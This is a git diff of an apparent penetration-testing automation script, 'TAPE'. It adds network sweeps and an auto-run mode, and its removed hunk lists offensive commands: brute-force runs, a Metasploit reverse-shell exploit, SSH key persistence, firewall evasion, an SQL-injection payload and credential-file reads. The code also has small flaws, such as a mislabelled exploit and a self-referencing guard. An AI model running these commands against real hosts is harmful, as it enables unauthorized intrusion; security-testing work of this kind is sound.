@@ -11,10 +11,12 @@
 
 import os
 import sys
+import re
 import shutil
 import requests
 import argparse
 import subprocess
+import yaml
 from collections import defaultdict
 from datetime import datetime
 from termcolor import cprint, colored
@@ -28,24 +30,22 @@ from tabulate import tabulate
 # Integrate Windows terminal coloring
 colorama.init()
 
-# Directories
-RECON_DIR = "recon"
-VULNS_DIR = "vulns"
-FILES_DIR = "files"
-NOTES_DIR = "notes"
+BASE_DIR = "/tmp/ctape"
+RECON_DIR = os.path.join(BASE_DIR, "recon")
+VULNS_DIR = os.path.join(BASE_DIR, "vulns")
+FILES_DIR = os.path.join(BASE_DIR, "files")
+NOTES_DIR = os.path.join(BASE_DIR, "notes")
 
-# Create necessary directories and files with proper permissions
 directories = [VULNS_DIR, RECON_DIR, FILES_DIR, NOTES_DIR]
 files = ["notes.txt", "users.txt", "passwords.txt", "hashes.txt", "creds.txt"]
 
 def create_directories_and_files():
-    """Create necessary directories and files."""
     is_windows = os.name == 'nt'
+    os.makedirs(BASE_DIR, exist_ok=True)
 
     for directory in directories:
         os.makedirs(directory, exist_ok=True)
         if not is_windows:
-            # On Unix-like systems, set ownership
             original_uid = int(os.environ.get('SUDO_UID', os.getuid()))
             original_gid = int(os.environ.get('SUDO_GID', os.getgid()))
             os.chown(directory, original_uid, original_gid)
@@ -53,15 +53,13 @@ def create_directories_and_files():
     for filename in files:
         filepath = os.path.join(NOTES_DIR, filename)
         with open(filepath, 'a'):
-            pass  # Create the file if it doesn't exist
+            pass
         if not is_windows:
-            # On Unix-like systems, set ownership
             os.chown(filepath, original_uid, original_gid)
 
-
-# Commands for each service and action
 # Updated to support grouped commands
 COMMANDS = defaultdict(lambda: defaultdict(lambda: defaultdict(list)))
+COMMANDS_NET = defaultdict(lambda: defaultdict(lambda: defaultdict(list)))
 
 # Services and their default ports
 SERVICES = {
@@ -90,26 +88,8 @@ SERVICES = {
 }
 
 # -----------------------------
-# Function Definitions
+# Argparser
 # -----------------------------
-
-def update_script():
-    cprint("[+] Checking for updates...", "blue")
-    github_url = "https://raw.githubusercontent.com/ChronosPK/TAPE/main/tape.py"
-    try:
-        response = requests.get(github_url, timeout=10)
-        if response.status_code == 200:
-            script_path = os.path.realpath(__file__)
-            backup_path = script_path + ".bak"
-            shutil.copy2(script_path, backup_path)
-            with open(script_path, 'w', encoding='utf-8') as script_file:
-                script_file.write(response.text)
-            cprint("[+] TAPE has been updated to the latest version.", "green")
-            cprint(f"[i] A backup is saved as {backup_path}.", "yellow")
-        else:
-            cprint(f"[!] Failed to download the latest version. HTTP Status Code: {response.status_code}", "red")
-    except Exception as e:
-        cprint(f"[!] An error occurred: {e}", "red")
 
 parser = argparse.ArgumentParser(
     description="TAPE - Tmux Automated Pentesting Enumeration",
@@ -127,16 +107,64 @@ parser.add_argument('-q', '--quiet', action='store_true', help='Suppress command
 parser.add_argument('-x', '--execute', action='store_true', help='Execute the enumeration process')
 parser.add_argument('-f', '--force-recon', action='store_true', help='Force reconnaissance scans even if already done')
 parser.add_argument('-u', '--update', action='store_true', help='Update TAPE to the latest version')
+parser.add_argument('--auto', action='store_true', help='Automatically scan all live hosts without confirmation (used with -n)')
 args = parser.parse_args()
 
-def display_help():
-    parser.print_help()
+
+# -----------------------------
+# Function Definitions
+# -----------------------------
+
+# YAML commands
+def load_commands(yaml_path='commands.yml'):
+    with open(yaml_path, 'r') as file:
+        return yaml.safe_load(file)
+
+def load_net_commands(yaml_path='commands_net.yml'):
+    with open(yaml_path, 'r') as file:
+        return yaml.safe_load(file)
+
+COMMANDS_NET = load_net_commands()
+COMMANDS = load_commands()
+
 
 def is_root():
     return os.geteuid() == 0
 
-import shutil
+# ctape -u
+def update_script():
+    cprint("[+] Checking for updates...", "blue")
+    github_url = "https://raw.githubusercontent.com/Chronos-Security/TAPE/main/tape.py"
+    try:
+        response = requests.get(github_url, timeout=10)
+        if response.status_code == 200:
+            script_path = os.path.realpath(__file__)
+            backup_path = script_path + ".bak"
+            shutil.copy2(script_path, backup_path)
+            with open(script_path, 'w', encoding='utf-8') as script_file:
+                script_file.write(response.text)
+            cprint("[+] TAPE has been updated to the latest version.", "green")
+            cprint(f"[i] A backup is saved as {backup_path}.", "yellow")
+        else:
+            cprint(f"[!] Failed to download the latest version. HTTP Status Code: {response.status_code}", "red")
+    except Exception as e:
+        cprint(f"[!] An error occurred: {e}", "red")
 
+#ctape -f bug
+if args.force_recon and not (args.ip or args.domain or args.net):
+    cprint("[!] You can't use --force-recon without a target.", "red")
+    sys.exit(1)
+
+#ctape -x bug
+if args.execute and not (args.ip or args.domain or args.execute):
+    cprint("[!] You can't use --execute without a target.", "red")
+    sys.exit(1)
+
+# ctape -h
+def display_help():
+    parser.print_help()
+
+# ctape -i -d
 def resolve_domain(domain):
     """Resolve a domain to an IP address using the 'dig' command."""
     if not shutil.which("dig"):
@@ -160,6 +188,7 @@ def format_command(command, variables):
         command = command.replace(key, value)
     return command
 
+#ctape -ls
 def list_services():
     """Lists all services with their default ports and transport protocols in a tabular format."""
     cprint("[+] Available Services:\n", "green")
@@ -172,6 +201,7 @@ def list_services():
     table = tabulate(services_data, headers=["Service", "Ports", "Transport"], tablefmt="github")
     print(table)
 
+# ctape -l
 def list_commands(commands, variables, service=None):
     services_to_list = [service.upper()] if service else sorted(
         commands.keys(), key=lambda x: SERVICES.get(x, {}).get('ports', [0])[0]
@@ -195,12 +225,150 @@ def list_commands(commands, variables, service=None):
                         cmd_display = format_command(cmd, variables)
                         cprint(cmd_display, "light_grey")
                     print()
+# ctape -n
+def scan_network(net):
+    cprint(f"[*] Scanning network {net} for active hosts...", "cyan")
+    try:
+        result = subprocess.check_output(
+            f"nmap -sn {net}",
+            shell=True,
+            stderr=subprocess.DEVNULL,
+            text=True
+        )
+        live_hosts = []
+        for line in result.splitlines():
+            if line.startswith("Nmap scan report for"):
+                match = re.search(r'\(([\d\.]+)\)', line)  # caută IP între paranteze
+                if match:
+                    ip = match.group(1)
+                else:
+                    ip = line.split()[-1]               
+                live_hosts.append(ip)
+
+        if live_hosts:
+            cprint(f"[+] Found {len(live_hosts)} active host(s):", "green")
+            for ip in live_hosts:
+                cprint(f"  └─ {ip}", "yellow")
+        else:
+            cprint("[!] No active hosts found in network.", "red")
+
+        return live_hosts
+
+    except Exception as e:
+        cprint(f"[!] Error during network scan: {e}", "red")
+        return []
+
+def enumerate_single_host(ip, variables, COMMANDS):
+    recon_path = os.path.join(RECON_DIR, f"{ip}.init")
+    alltcp_path = os.path.join(RECON_DIR, f"{ip}.alltcp")
+
+    # Recon
+    if os.path.exists(recon_path) and not args.force_recon:
+        cprint(f"[*] Reconnaissance already exists for {ip}.", "yellow")
+    else:
+        cprint(f"[*] Running reconnaissance for {ip}...", "green")
+        for cmd in COMMANDS_NET['RECON']['Single Host']['nmap'][0]['commands']:
+            cmd_exec = format_command(cmd.replace('IP', ip).replace('RECON_DIR', RECON_DIR), variables)
+            if not args.quiet:
+                cprint(f"$ {cmd_exec}", "light_yellow")
+            run_command(cmd_exec, quiet=args.quiet)
+
+    # Port extraction
+    open_ports = []
+    if os.path.exists(recon_path):
+        with open(recon_path, 'r') as f:
+            for line in f:
+                if '/tcp' in line and 'open' in line:
+                    port = line.split('/')[0].strip()
+                    open_ports.append(port)
+    if not open_ports:
+        cprint(f"[!] No open ports found on {ip}.", "red")
+        return
+
+    variables['OPEN_PORTS'] = ','.join(open_ports)
+    cprint(f"[*] Open ports: {variables['OPEN_PORTS']}", "yellow")
+
+    # Parse services
+    discovered_services = defaultdict(list)
+    if os.path.exists(alltcp_path):
+        with open(alltcp_path, 'r') as f:
+            for line in f:
+                if '/tcp' in line and 'open' in line:
+                    parts = line.split()
+                    port = parts[0].split('/')[0]
+                    service = parts[2].upper() if len(parts) >= 3 else 'UNKNOWN'
+                    discovered_services[service].append(port)
+    else:
+        cprint(f"[!] No detailed scan output for {ip}.", "red")
+        return
+
+    if not discovered_services:
+        cprint(f"[!] No services detected for {ip}.", "red")
+        return
+
+    # Select commands to run
+    commands_to_execute = defaultdict(lambda: defaultdict(lambda: defaultdict(list)))
+    for service in discovered_services:
+        if service in COMMANDS_NET:
+            for action in COMMANDS_NET[service]:
+                for subaction in COMMANDS_NET[service][action]:
+                    for cmd_group in COMMANDS_NET[service][action][subaction]:
+                        commands_to_execute[service][action][subaction].append(cmd_group)
+        else:
+            cprint(f"[!] No commands found for service: {service}", "yellow")
+
+    # Execute
+    if args.execute:
+        cprint(f"[*] Executing commands for {ip}...", "green")
+        for protocol in commands_to_execute:
+            variables['PORT'] = ','.join(discovered_services.get(protocol, []))
+            for action in commands_to_execute[protocol]:
+                for subaction in commands_to_execute[protocol][action]:
+                    title = f"{protocol} - {action} - {subaction}"
+                    cprint(title, "red", "on_cyan", attrs=["bold", "dark"])
+                    for cmd_group in commands_to_execute[protocol][action][subaction]:
+                        desc = cmd_group.get("description")
+                        if desc:
+                            cprint(f"# {desc}", "cyan")
+                        for cmd in cmd_group.get("commands", []):
+                            cmd_exec = format_command(cmd, variables)
+                            if not args.quiet:
+                                cprint(f"$ {cmd_exec}", "light_yellow")
+                            run_command(cmd_exec, quiet=args.quiet)
+
+
+#ctape -q
+def run_command(cmd, quiet=False):
+    return subprocess.call(
+        cmd,
+        shell=True,
+        stdout=subprocess.DEVNULL if quiet else None,
+        stderr=subprocess.DEVNULL if quiet else None
+    )
+
+# ctape -e
+def check_environment():
+    if not all(os.path.exists(d) for d in directories):
+        cprint("[!] Environment not found in /tmp/ctape", "red")
+        cprint("[!] You need to run ctape -e", "yellow")
+        sys.exit(1)
 
 
 def main():
-    if len(sys.argv) == 1:
-        display_help()
-        sys.exit(1)
+    if args.env:
+        if os.path.exists(BASE_DIR) and all(os.path.exists(d) for d in directories):
+            cprint("[i] Environment already exists at /tmp/ctape", "yellow")
+        else:
+            create_directories_and_files()
+            cprint("[+] Directories and files have been created in /tmp/ctape", "green")
+        sys.exit(0)
+
+    if len(sys.argv) == 1 or any(arg in sys.argv for arg in ['-h', '--help']):
+        parser.print_help()
+        sys.exit(0)
+
+    if not args.env:
+        check_environment()
 
     variables = {
         'IP': args.ip if args.ip else 'IP',
@@ -211,16 +379,55 @@ def main():
         'PASS': 'PASS',
     }
 
+
     if args.list_services:
         list_services()
         sys.exit(0)
-    
-    if args.env:
-        create_directories_and_files()
-        cprint("[+] Directories and files have been created.", "green")
+
+    if args.net:
+        ips = scan_network(args.net)
+        if not ips:
+            sys.exit(1)
+
+        ip_list_path = os.path.join(FILES_DIR, 'live_hosts.txt')
+        with open(ip_list_path, 'w') as f:
+            f.write('\n'.join(ips))
+        cprint(f"[i] Active hosts saved to: {ip_list_path}", "cyan")
+
+        if args.auto:
+            selected_ips = ips
+        else:
+            print()
+            cprint("[i] Do you want to scan ports for:", "cyan")
+            cprint("  [y] All hosts", "yellow")
+            cprint("  [n] None", "yellow")
+            cprint("  [s] Select specific IPs", "yellow")
+
+            choice = input("\nYour choice [n/y/s]: ").strip().lower()
+
+            if choice == 'y':
+                selected_ips = ips
+            elif choice == 's':
+                cprint("[?] Enter IPs separated by comma (ex: 192.168.1.10,192.168.1.25):", "cyan")
+                user_input = input("IPs: ").strip()
+                selected_ips = [ip.strip() for ip in user_input.split(',') if ip.strip() in ips]
+                if not selected_ips:
+                    cprint("[!] No valid IPs selected. Exiting.", "red")
+                    sys.exit(1)
+            else:
+                cprint("[i] Skipping port scanning.", "cyan")
+                sys.exit(0)
+
+        for ip in selected_ips:
+            cprint(f"\n[>] Starting enumeration for {ip}", "blue")
+            args.ip = ip
+            variables['IP'] = ip
+            variables['DOMAIN'] = 'DOMAIN'
+            variables['URL'] = f"http://{ip}"
+            enumerate_single_host(ip, variables, COMMANDS_NET)
+
         sys.exit(0)
 
-    # If both IP and domain are provided
     if args.ip and args.domain:
         resolved_ip = resolve_domain(args.domain)
         if resolved_ip:
@@ -234,23 +441,24 @@ def main():
             cprint(f"[!] Error: Unable to resolve domain {args.domain}.", "red")
             sys.exit(1)
 
-    if args.domain:
+    elif args.domain:
         try:
             resolved_ip = resolve_domain(args.domain)
             if resolved_ip:
                 cprint(f"[+] Domain {args.domain} resolved to {resolved_ip}.", "green")
+                variables['IP'] = resolved_ip 
+                variables['DOMAIN'] = args.domain
             else:
                 cprint(f"[!] Could not resolve domain {args.domain}.", "red")
+                sys.exit(1)
         except EnvironmentError as e:
             cprint(f"[!] {e}", "red")
             sys.exit(1)
 
     elif args.ip:
-        # Only IP is provided
         variables['IP'] = args.ip
         variables['DOMAIN'] = 'DOMAIN'
     else:
-        # Neither IP nor domain is provided
         variables['IP'] = 'IP'
         variables['DOMAIN'] = 'DOMAIN'
 
@@ -261,674 +469,20 @@ def main():
     # Prioritize domain over IP in URL
     variables['URL'] = f"http://{variables['DOMAIN'] if variables['DOMAIN'] != 'DOMAIN' else variables['IP']}"
 
-    # Create commands for recon and for each service
-    COMMANDS['RECON']['Network'][''] = [
-        {
-            'description': "netdiscover",
-            'commands': [
-                r"""sudo netdiscover -i eth0 -r NET"""
-            ]
-        },
-        {
-            'description': "nmap",
-            'commands': [
-                r"""nmap -Pn -p- -v -T4 --max-retries 5 IP -oN recon/nmap.init""",
-                r"""cat recon/nmap.init | grep -E "^[0-9]+/tcp.*(open|filtered|closed)" | awk '{print $1}' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//g' > recon/ports""",
-                r"""sudo nmap -Pn -sS -sV -n -v -A -T4 -p $(cat recon/ports) IP -oN recon/nmap.alltcp"""
-            ]
-        },
-        {
-            'description': "fping + nmap",
-            'commands': [
-                r"""fping -a -g NET 2>/dev/null > recon/hosts""",
-                r"""nmap -sC -sV -v -A -T4 -Pn -iL recon/hosts -n -p- -oN recon/nmap.network --open --max-retries 5"""
-            ]
-        },
-        {
-            'description': "masscan",
-            'commands': [
-                r"""masscan NET –echo > recon/masscan.conf"""
-            ]
-        },
-        {
-            'description': "UDP with nmap",
-            'commands': [
-                r"""nmap -sU -sV --version-intensity 0 -F -n NET -oN recon/nmap.udp-net""",
-                r"udp-proto-scanner.pl NET"
-            ]
-        },
-        {
-            'description': "No man's land",
-            'commands': [
-                r"""for i in {1..254} ;do (ping -c 1 10.10.10.$i | grep 'bytes from' | awk '{print $4}' | cut -d ':' -f 1 &) ;done"""
-            ]
-        }
-    ]
-
-#------------------------------------------------------------------------------------------------------------------
-    COMMANDS['RECON']['Single Host']['nmap'] = [
-        {
-            "description": "Extract ports and run all-TCP scan",
-            "commands": [
-                r"""nmap -Pn -p- -v -T4 --max-retries 5 IP -oN recon/nmap.init""",
-                r"""cat recon/nmap.init | grep -E "^[0-9]+/tcp.*(open|filtered|closed)" | awk '{print $1}' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//g' > recon/ports""",
-                r"""sudo nmap -Pn -sS -sV -n -v -A -T4 -p $(cat recon/ports) IP -oN recon/nmap.alltcp"""
-            ]
-        },
-        {
-            "description": "Perform OS detection with Nmap",
-            "commands": [
-                r"""sudo nmap -O -Pn -p- -T4 --max-retries 4 -v IP -oN recon/nmap.os"""
-            ]
-        },
-        {
-            "description": "Vulnerability scan with Nmap",
-            "commands": [
-                r"""nmap --script vulners -Pn -sC -sV -v -A -T4 -p- --max-retries 5 --open IP -oN recon/nmap.vuln"""
-            ]
-        },
-        {
-            "description": "Run UDP scan with Nmap",
-            "commands": [
-                r"""nmap -sU -sV -sC -n -F -T4 IP -oN recon/nmap.udp"""
-            ]
-        },
-        {
-            'description': "Firewall evasion",
-            'commands': [
-                r"""sudo nmap -v -Pn -sS -sV -T4 --max-retries 3 --min-rate 450 --max-rtt-timeout 500ms --min-rtt-timeout 50ms -p- -f --source-port 53 --spoof-mac aa:bb:cc:dd:ee:ff IP"""
-        ]
-        }
-    ]
-    COMMANDS['RECON']['Single Host']['rustscan'] = [
-        {
-            "description": "Fast rustscan analysis",
-            "commands": [
-                r"""rustscan -a IP --ulimit 5000 -- -sC -sV -v -oN recon/rustscan.init"""
-            ]
-        },
-    ]
-    COMMANDS['RECON']['Single Host']['autorecon'] = [
-        {
-            "description": "Enumeration with autorecon",
-            "commands": [
-                r"""autorecon -v --heartbeat 10 IP"""
-            ]
-        },
-    ]
-    COMMANDS['RECON']['Single Host']['legion'] = [
-        {
-            "description": "Recon with legion - GUI application",
-            "commands": [
-                r"""sudo legion"""
-            ]
-        },
-    ]
-    COMMANDS['RECON']['Single Host']['zenmap'] = [
-        {
-            "description": "Recon with zenmap - GUI application",
-            "commands": [
-                r"""zenmap"""
-            ]
-        },
-    ]
-    COMMANDS['RECON']['Single Host']['No man\'s land'] = [
-        {
-            "description": "Utilizing /dev/tcp/ip/port to test connection",
-            "commands": [
-                r"""for port in {1..65535}; do echo 2>/dev/null > /dev/tcp/IP/$port && echo -e "$port open\n"; done"""
-            ]
-        },
-    ]
-
-#------------------------------------------------------------------------------------------------------------------
-    COMMANDS['FTP']['Enumeration']['Anonymous Access'] = [
-        {
-            'description': "Check for anonymous FTP login with Nmap",
-            'commands': [
-                r"""nmap -p PORT --script ftp-anon IP -oN recon/ftp_anonymous.txt"""
-            ]
-        },
-        {
-            'description': "Check for anonymous FTP login with FTP client",
-            'commands': [
-                r"""ftp -nv IP PORT"""
-            ]
-        }
-    ]
-    COMMANDS['FTP']['Enumeration']['Banner Grabbing'] = [
-        {
-            'description': "FTP Banner Grabbing with Nmap",
-            'commands': [
-                r"""nmap -sV -p PORT IP -oN recon/ftp_banner.txt"""
-            ]
-        },
-        {
-            'description': "FTP Banner Grabbing with Netcat",
-            'commands': [
-                r"""nc -nv IP PORT"""
-            ]
-        }
-    ]
-    COMMANDS['FTP']['Enumeration']['Brute Force'] = [
-        {
-            'description': "FTP Brute Force with Hydra",
-            'commands': [
-                r"""hydra -L users.txt -P passwords.txt ftp://IP -s PORT"""
-            ]
-        },
-        {
-            'description': "FTP User Enumeration with ftp-user-enum",
-            'commands': [
-                r"""ftp-user-enum.pl -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t IP"""
-            ]
-        }
-    ]
-    COMMANDS['FTP']['Access']['Read Permissions'] = [
-        {
-            'description': "List files and directories",
-            'commands': [
-                r"""ls -lsa"""
-            ]
-        },
-        {
-            'description': "Download a specific file",
-            'commands': [
-                r"""get FILENAME"""
-            ]
-        },
-        {
-            'description': "Download all files",
-            'commands': [
-                r"""prompt; mget *"""
-            ]
-        },
-        {
-            'description': "Recursive download using wget",
-            'commands': [
-                r"""wget -r ftp://USER:PASS@IP/"""
-            ]
-        },
-        {
-            'description': "Enter passive FTP session",
-            'commands': [
-                r"""quote PASV"""
-            ]
-        }
-    ]
-    COMMANDS['FTP']['Access']['Write Permissions'] = [
-        {
-            'description': "Upload binary files",
-            'commands': [
-                r"""binary; put BINARY_FILE"""
-            ]
-        },
-        {
-            'description': "Upload ASCII files",
-            'commands': [
-                r"""ascii; put ASCII_FILE"""
-            ]
-        }
-    ]
-    COMMANDS['FTP']['Access']['Mount Folders'] = [
-        {
-            'description': "Mount FTP folder using curlftpfs",
-            'commands': [
-                r"""mkdir /mnt/ftp""",
-                r"""curlftpfs IP /mnt/ftp/ -o user=USER:PASS"""
-            ]
-        },
-        {
-            'description': "Unmount FTP folder",
-            'commands': [
-                r"""fusermount -u /mnt/ftp"""
-            ]
-        }
-    ]
-    COMMANDS['FTP']['Access']['mod_copy RCE in vsftpd 1.3.5 '] = [
-        {
-            'description': "Exploit manually",
-            'commands': [
-                r"""nc -v IP 21""",
-                r"""site cpfr LOCAL_FILE""",
-                r"""site cpto FTP_DIRECTORY"""
-            ]
-        },
-        {
-            'description': "Exploit with metasploit",
-            'commands': [
-                r"""sudo msfdb start""",
-                r"""msfconsole -q """,
-                r"""use /exploit/unix/ftp/proftpd_modcopy_exec""",
-                r"""set rhosts IP""",
-                r"""set lhost tun0""",
-                r"""set sitepath /var/www/something""",
-                r"""set payload cmd/unix/reverse_python"""
-            ]
-        }
-    ]
-
-#------------------------------------------------------------------------------------------------------------------
-    COMMANDS['SSH']['Enumeration']['Banner Grabbing'] = [
-        {
-            'description': "SSH Banner Grabbing with Nmap",
-            'commands': [
-                r"""nmap -p22 IP -sV"""
-            ]
-        },
-        {
-            'description': "SSH Keyscan",
-            'commands': [
-                r"""ssh-keyscan -t rsa IP -p 22"""
-            ]
-        }
-    ]
-    COMMANDS['SSH']['Enumeration']['Algorithm Enumeration'] = [
-        {
-            'description': "List supported algorithms",
-            'commands': [
-                r"""nmap -p22 IP --script ssh2-enum-algos -oN recon/ssh-alg"""
-            ]
-        }
-    ]
-    COMMANDS['SSH']['Brute Force']['Hydra'] = [
-        {
-            'description': "Brute force SSH with Hydra",
-            'commands': [
-                r"""hydra -l USER -P notes/passwords.txt ssh://IP -s 22"""
-            ]
-        }
-    ]
-    COMMANDS['SSH']['Access'][''] = [
-        {
-            'description': "Execute a command right after login",
-            'commands': [
-                r"""ssh -v USER@IP id;cat /etc/passwd"""
-            ]
-        }
-    ]
-    COMMANDS['SSH']['Access']['ID_RSA key'] = [
-        {
-            'description': "Simple login",
-            'commands': [
-                r"""chmod 600 id_rsa""",
-                r"""ssh -i id_rsa USER@IP"""
-            ]
-        },
-        {
-            'description': "Passphrase protected",
-            'commands': [
-                r"""ssh2john id_rsa > notes/hashes-ssh.txt"""
-                r"""john notes/hashes-ssh.txt --wordlist=/usr/share/wordlists/rockyou.txt"""
-            ]
-        }
-    ]
-    COMMANDS['SSH']['Access']['Tunnel'] = [
-        {
-            'description': "Local Tunnel",
-            'commands': [
-                r"""ssh -L local_ip:local_port:destination_ip:destination_port user@IP"""
-            ]
-        },
-        {
-            'description': "Remote Tunnel",
-            'commands': [
-                r"""ssh -R remote_ip:remote_port:destination_ip:destination_port user@IP"""
-            ]
-        },
-        {
-            'description': "Additional arguments",
-            'commands': [
-                r"""-N don't execute commands"""
-                r"""-f run in background"""
-            ]
-        }
-    ]
-    COMMANDS['SSH']['Access']['Persistence'] = [
-        {
-            'description': "Generate SSH keys",
-            'commands': [
-                r"""ssh-keygen"""
-                r"""scp ~/.ssh/id_rsa.pub USER@IP:/home/USER/.ssh/authorized_keys"""
-            ]
-        }
-    ]
-    COMMANDS['SSH']['Other']['Port Knock'] = [
-        {
-            'description': "Check config file",
-            'commands': [
-                r"""sudo nano /etc/knockd.conf"""
-                r"""sudo vim /etc/default/knockd"""
-            ]
-        },
-        {
-            'description': "Knock on the found ports to open SSH",
-            'commands': [
-                r"""knock -v IP port1 port2 port3"""
-            ]
-        }
-    ]
-
-#------------------------------------------------------------------------------------------------------------------
-    COMMANDS['TELNET']['Enumeration']['nmap'] = [
-        {
-            'description': "",
-            'commands': [
-                r"""nmap -n -sV -Pn --script "*telnet* and safe" -p PORT IP -oN recon/nmap.telnet"""
-            ]
-        }
-    ]
-    COMMANDS['TELNET']['Bruteforce']['hydra'] = [
-        {
-            'description': "",
-            'commands': [
-                r"""hydra -l root -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt IP telnet"""
-            ]
-        }
-    ]
-
-#------------------------------------------------------------------------------------------------------------------
-    COMMANDS['SMTP']['Enumeration']['VRFY Command'] = [
-        {
-            'description': "Check for valid users with VRFY",
-            'commands': [
-                r"""nc IP 25""",
-                r"""VRFY root""",
-                r"""VRFY user"""
-            ]
-        },
-        {
-            'description': "Possible responses",
-            'commands': [
-                r"""252 2.0.0 root"""
-                r"""550 5.1.1 user: ... User unknown in local recipient table"""
-            ]
-        }
-    ]
-    COMMANDS['SMTP']['Enumeration']['Users Enumeration'] = [
-        {
-            'description': "With smtp-user-enum",
-            'commands': [
-                r"""smtp-user-enum -M VRFY -U users.txt -t IP"""
-            ]
-        },
-        {
-            'description': "With nmap",
-            'commands': [
-                r"""nmap --script smtp-enum-users IP -oN recon/nmap.smtp-users"""
-            ]
-        },
-        {
-            'description': "With metasploit",
-            'commands': [
-                r"""msfconsole -q -e "use auxiliary/scanner/smtp/smtp_enum" """
-            ]
-        }
-    ]
-    COMMANDS['SMTP']['Enumeration']['Allowed Commands'] = [
-        {
-            'description': "Use nmap to find allowed commands",
-            'commands': [
-                r"""nmap -p PORT --script smtp-commands IP -oN recon/nmap.smtp-comm"""
-            ]
-        }
-    ]
-    COMMANDS['SMTP']['Enumeration']['Check NTLM Authentication'] = [
-        {
-            'description': "Use nmap",
-            'commands': [
-                r"""nmap -sS -v --script=*-ntlm-info --script-timeout=60s DOMAIN -oN recon/nmap.smtp-ntlm"""
-            ]
-        },
-        {
-            'description': "Check for NTLM challenge response for information disclosure",
-            'commands': [
-                r"""telnet DOMAIN PORT""",
-                r"""HELO""",
-                r"""NTLM AUTH""",
-                r"""TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA="""
-            ]
-        }
-    ]
-    COMMANDS['SMTP']['Enumeration']['Find MX servers'] = [
-        {
-            'description': "Enumerate with dig",
-            'commands': [
-                r"""dig +short mx DOMAIN"""
-            ]
-        }
-    ]
-    COMMANDS['SMTP']['Access']['Enumeration'] = [
-        {
-            'description': "Things to try while on the server",
-            'commands': [
-                r"""- look for info about the network topology""",
-                r"""- view headers for relevant information"""
-            ]
-        }
-    ]
-
-#------------------------------------------------------------------------------------------------------------------
-    COMMANDS['WHOIS']['Enumeration']['Find the domain'] = [
-        {
-            'description': "Enumeration",
-            'commands': [
-                r"""whois -h IP -p PORT "DOMAIN" """,
-                r"""echo "DOMAIN" | nc -vn IP PORT """
-            ]
-        }
-    ]
-    COMMANDS['WHOIS']['Exploitation']['SQL injection'] = [
-        {
-            'description': "Payload",
-            'commands': [
-                r"""whois -h IP -p PORT "a') or 1=1# """
-            ]
-        }
-    ]
-
-#------------------------------------------------------------------------------------------------------------------
-    COMMANDS['DNS']['Enumeration']['Automated'] = [
-        {
-            'description': "Automated enumeration",
-            'commands': [
-                r"""nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" IP -oN recon/nmap.dns""",
-                r"""dnscan.py -d DOMAIN -r -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"""
-            ]
-        }
-    ]
-    COMMANDS['WHOIS']['Enumeration']['View Records'] = [
-        {
-            'description': "All records",
-            'commands': [
-                r"""dig DOMAIN ALL"""
-            ]
-        },
-        {
-            'description': "A records",
-            'commands': [
-                r"""dig DOMAIN +short"""
-            ]
-        },
-        {
-            'description': "Mail server",
-            'commands': [
-                r"""dig DOMAIN -t mx +short"""
-            ]
-        },
-        {
-            'description': "NS, CNAME records",
-            'commands': [
-                r"""dig DOMAIN -t ns +short"""
-            ]
-        },
-        {
-            'description': "ZONE transfer",
-            'commands': [
-                r"""dig axfr DOMAIN ns08.DOMAIN""",
-                r"""dig axfr IP DOMAIN""",
-                r"""dig @IP DOMAIN -t AXFR +nocookie""",
-                r"""host -t axfr DOMAIN IP""",
-                r"""dnsrecon -d DOMAIN -t axfr"""
-            ]
-        },
-        {
-            'description': "Specify a DNS server",
-            'commands': [
-                r"""dig @IP DOMAIN"""
-            ]
-        }
-    ]
-    COMMANDS['DNS']['Bruteforce']['Subdomains'] = [
-        {
-            'description': "Bruteforce subdomains",
-            'commands': [
-                r"""wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u "DOMAIN" -H "Host: FUZZ.DOMAIN" --hl 7 -f recon/subdomains.txt""",
-                r"""gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u DOMAIN""",
-                r"""nmap -T4 -p PORT --script dns-brute DOMAIN""",
-                r"""dnsrecon -d DOMAIN -D /usr/share/wordlists/dnsmap.txt -t std --xml recon/dnsrecon.xml""",
-                r"""puredns bruteforce all.txt $domain"""
-            ]
-        }
-    ]
-
-#------------------------------------------------------------------------------------------------------------------
-    COMMANDS['TFTP']['Enumeration']['Nmap'] = [
-        {
-            'description': "Enumerate with nmap",
-            'commands': [
-                r"""nmap -n -Pn -sUV -pPORT --script tftp-enum IP -oN recon/nmap.tftp"""
-            ]
-        }
-    ]
-    COMMANDS['TFTP']['Enumeration']['Metasploit'] = [
-        {
-            'description': "See upload/download capabilities",
-            'commands': [
-                r"""msfconsole -q -e "use auxiliary/admin/tftp/tftp_transfer_util"""
-            ]
-        }
-    ]
-
-#------------------------------------------------------------------------------------------------------------------
-    COMMANDS['SMB']['Enumeration']['Nmap Scripts'] = [
-        {
-            'description': "Run SMB NSE Scripts",
-            'commands': [
-                r"""nmap --script "safe or smb-enum-*" -p 139,445 IP -oN recon/nmap.smb"""
-            ]
-        }
-    ]
-    COMMANDS['SMB']['Enumeration']['Enum4Linux'] = [
-        {
-            'description': "Enumerate SMB with Enum4Linux",
-            'commands': [
-                r"""enum4linux -avA IP > recon/enum4linux.out"""
-            ]
-        }
-    ]
-    COMMANDS['SMB']['Brute Force']['Hydra'] = [
-        {
-            'description': "Brute force SMB with Hydra",
-            'commands': [
-                r"""hydra -L users.txt -P passwords.txt IP smb"""
-            ]
-        }
-    ]
-
-#------------------------------------------------------------------------------------------------------------------
-    COMMANDS['NFS']['Enumeration']['Showmount'] = [
-        {
-            'description': "List NFS shares",
-            'commands': [
-                r"""showmount -e IP"""
-            ]
-        }
-    ]
-    COMMANDS['NFS']['Access']['Mount Share'] = [
-        {
-            'description': "Mount NFS share",
-            'commands': [
-                r"""mkdir /mnt/nfs""",
-                r"""mount -t nfs IP:/share /mnt/nfs"""
-            ]
-        }
-    ]
-    COMMANDS['NFS']['Access']['Unmount Share'] = [
-        {
-            'description': "Unmount NFS share",
-            'commands': [
-                r"""umount /mnt/nfs"""
-            ]
-        }
-    ]
-
-#------------------------------------------------------------------------------------------------------------------
-    COMMANDS['LDAP']['Enumeration']['Nmap Scripts'] = [
-        {
